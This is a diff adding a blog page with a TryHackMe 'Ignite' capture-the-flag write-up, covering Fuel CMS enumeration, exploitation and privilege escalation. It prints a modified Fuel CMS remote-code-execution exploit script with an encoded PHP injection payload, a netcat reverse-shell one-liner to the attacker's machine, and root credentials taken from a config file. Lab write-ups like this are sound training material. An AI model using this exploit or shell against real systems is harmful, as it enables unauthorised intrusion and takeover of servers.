@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/CCrashZer0/ccrashzer0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CCrashZer0/ccrashzer0.github.io/livereload" data-no-instant defer></script>
+  <title>
+  Ignite: TryHackMe Writeup · CCrashZer0
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CCrashZer0">
+<meta name="description" content="Try Hack Me - Ignite Link to heading A new start-up has a few issues with their web server.
+Disclaimer - Your IP address will be different! Link to heading Objectives Link to heading Locate the User.txt
+Locate the Root.txt
+Scanning and Enumeration Link to heading We are going to start this with a simple nmap scan to see what ports are open.
+Command: nmap -T4 -sC -sV -oN nmap\inital &lt;ip&gt; Command Breakdown:">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Ignite: TryHackMe Writeup">
+  <meta name="twitter:description" content="Try Hack Me - Ignite Link to heading A new start-up has a few issues with their web server.
+Disclaimer - Your IP address will be different! Link to heading Objectives Link to heading Locate the User.txt
+Locate the Root.txt
+Scanning and Enumeration Link to heading We are going to start this with a simple nmap scan to see what ports are open.
+Command: nmap -T4 -sC -sV -oN nmap\inital &lt;ip&gt; Command Breakdown:">
+
+<meta property="og:url" content="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/ignite/">
+  <meta property="og:site_name" content="CCrashZer0">
+  <meta property="og:title" content="Ignite: TryHackMe Writeup">
+  <meta property="og:description" content="Try Hack Me - Ignite Link to heading A new start-up has a few issues with their web server.
+Disclaimer - Your IP address will be different! Link to heading Objectives Link to heading Locate the User.txt
+Locate the Root.txt
+Scanning and Enumeration Link to heading We are going to start this with a simple nmap scan to see what ports are open.
+Command: nmap -T4 -sC -sV -oN nmap\inital &lt;ip&gt; Command Breakdown:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="tutorials">
+    <meta property="article:published_time" content="2020-07-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-07-23T00:00:00+00:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/ignite/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/">
+      CCrashZer0
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/tutorials/">Tutorials</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/ignite/">
+          Ignite: TryHackMe Writeup
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="try-hack-me---ignite">
+  Try Hack Me - Ignite
+  <a class="heading-link" href="#try-hack-me---ignite">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>A new start-up has a few issues with their web server.</p>
+<h2 id="disclaimer---your-ip-address-will-be-different">
+  Disclaimer - Your IP address will be different!
+  <a class="heading-link" href="#disclaimer---your-ip-address-will-be-different">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<hr>
+<h2 id="objectives">
+  Objectives
+  <a class="heading-link" href="#objectives">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ol>
+<li>
+<p>Locate the User.txt</p>
+</li>
+<li>
+<p>Locate the Root.txt</p>
+</li>
+</ol>
+<hr>
+<h2 id="scanning-and-enumeration">
+  Scanning and Enumeration
+  <a class="heading-link" href="#scanning-and-enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We are going to start this with a simple nmap scan to see what ports are open.<br>
+Command: <code>nmap -T4 -sC -sV -oN nmap\inital &lt;ip&gt;</code>
+Command Breakdown:</p>
+<pre tabindex="0"><code>-T4: speed of nmap scan is 4/5 (personal preference of mine)
+
+-sC: Scan with default NSE scripts. Considered useful for discovery and safe
+
+-sV: Attempts to determine the version of the service running on port
+
+-oN: Normal output to the file normal.file
+</code></pre><p>NMAP Results:<br>
+From our intinal scann it seems that there is only one port open and the it 80.<br>
+So lets open up our browser and see what shows up when we enter in the IP address of our challenge.</p>
+<pre tabindex="0"><code># Nmap 7.80 scan initiated Thu Jul  9 19:15:51 2020 as: nmap -T4 -sC -sV -oN nmapinital 10.10.220.239
+Nmap scan report for 10.10.220.239
+Host is up (0.15s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+</code></pre><h1 id="recon">
+  Recon
+  <a class="heading-link" href="#recon">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>It looks like we have a functioning web service running the Fuel CMS.<br>
+<figure><img src="/images/Ignite/webService.png">
+</figure>
+
+Now if we scroll futher down on this page it seems that the created has already provided us with the URL to the log in panel and the credentials needed to log in as well.<br>
+<figure><img src="/images/Ignite/creds.png">
+</figure>
+
+So lets navigate to the <code>/fuel</code> url and see if we are actually able to log into this CMS.<br>
+<figure><img src="/images/Ignite/login.png">
+</figure>
+
+Once we have entere in the credentials taht we found earlier it takes us direclty to the main dashboard for this application.<br>
+<figure><img src="/images/Ignite/dashboard.png">
+</figure>
+
+Since I am not quite sure what to do with the dashboard I am going to place it on the back burner for now.<br>
+Lets pull up searchsploit and see if we are able to find exploits for Fuel CMS.<br>
+It looks like there is an Remote Code Execution vulnerability that we may be able to take advtange of.<br>
+<figure><img src="/images/Ignite/searchSploit.png">
+</figure>
+
+I make a copy of this vulnerability into an exploite folder for this challenge.<br>
+Command: <code>cp /usr/share/exploitdb/exploits/linux/webapps/47138.py /media/sf_CTF/THM/Ignite/exploits/RCE.py</code><br>
+Now that we have a copy of that exploite let take a look at the content of it.<br>
+We are going to use nano.<br>
+Command: <code>nano RCE.py</code></p>
+<p>I had to make a couple of changes to the exploite.<br>
+The first thing that I did was remove the port number,<br>
+Secondly I remove the proxy variable.<br>
+This is what you should have in at the end.<br>
+Now when we run the exploite we are given a nice <code>CMD:</code> prompt.<br>
+This is what you should have in at the end.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.220.239&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_nth_overlapping</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">needle</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">start</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">,</span> <span class="n">start</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">start</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">xxxx</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;cmd:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">burp0_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s2">&#34;/fuel/pages/select/?filter=</span><span class="si">%27%</span><span class="s2">2b</span><span class="si">%70%</span><span class="s2">69</span><span class="si">%28%</span><span class="s2">70</span><span class="si">%72%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">28</span><span class="si">%24%</span><span class="s2">61</span><span class="si">%3d%27%</span><span class="s2">73</span><span class="si">%79%</span><span class="s2">73</span><span class="si">%74%</span><span class="s2">65</span><span class="si">%6d%27%</span><span class="s2">29</span><span class="si">%29%</span><span class="s2">2b</span><span class="si">%24%</span><span class="s2">61</span><span class="si">%28%</span><span class="s2">27&#34;</span><span class="o">+</span><span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">xxxx</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="si">%27%</span><span class="s2">29%2b%27&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.0.0.1:8080&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+</span></span></code></pre></div><p>As you can see we are able to run some commands remotely. When this new found power it is possible that we can create a reverse shell and then find out first flag.</p>
+<p><figure><img src="/images/Ignite/exploit.png">
+</figure>
+
+Let&rsquo;s see if <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"  class="external-link" target="_blank" rel="noopener">pentest monkey</a> has any one liners that we can try and chain together with this exploit. Well, well, well it looks like there is an one liner for seting up a netcat reverse shell. How about we give it a shot.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.8.2.222 <span class="m">4444</span> &gt;/tmp/f
+</span></span></code></pre></div><figure><img src="/images/Ignite/RCE.png">
+</figure>
+
+<p>Before we try and run this revser sell we are going to need to set up a netcat lisitener on out host machine.<br>
+Command: <code>nc -lvnp 4444</code></p>
+<p>Code Breakdown:</p>
+<pre tabindex="0"><code class="language-netcat" data-lang="netcat">-l: listen mode, for inbound connects
+
+-v: verbose [use twice to be more verbose]
+
+-n: numeric-only IP addresses, no DNS
+
+-p: local port number
+</code></pre><p><figure><img src="/images/Ignite/firstShell.png">
+</figure>
+
+It looks like it worked! Now it is time to snoop around and see if we are able to find out user flag.<br>
+After running the <code>ls</code> command a few times I was able to locate our first flag.<br>
+We are going to use the <code>cat</code> command to receive the content of the <code>user.txt</code> file.<br>
+<figure><img src="/images/Ignite/userFlag.png">
+</figure>
+
+<br></p>
+<h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<hr>
+<p>It is time to try and now to try and find out root flag.<br>
+So where shall we start at. If you rember when we first accessed the Fuel CMS there was a small little information section that states a database file could be found at <code>/var/www/html/fuel/application/config/database.php</code>.<br>
+<figure><img src="/images/Ignite/dbPath.png">
+</figure>
+</p>
+<p>Let&rsquo;s go check out that file and see what it contains.<br>
+It seems like we have stumbled across the root username and password.<br>
+<figure><img src="/images/Ignite/rootCreds.png">
+</figure>
+</p>
+<p>We can take the credentials that we just found and try to upgrade our user to a root user.
+Before we start running any commands we should try and do is create a stable shell.<br>
+This can be done by using python and the following command <code>python -c ‘import pty; pty.spawn(“/bin/bash”)’</code>.<br>
+Once our shell has become stable we can use the <code>su</code> command to switch into our root user account.
+<br>
+<figure><img src="/images/Ignite/stableShell.png">
+</figure>
+
+Now that our shell is stable we are going to verify that we are actually root.<br>
+Great we are in fact root. Now lets receive the root flag. <br>
+<figure><img src="/images/Ignite/rootFlag.png">
+</figure>
+</p>
+<h2 id="congratulations-you-have-just-completed-the-ignite-challenge">
+  Congratulations you have just completed the Ignite challenge!
+  <a class="heading-link" href="#congratulations-you-have-just-completed-the-ignite-challenge">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CCrashZer0 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/CCrashZer0/ccrashzer0.github.io/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
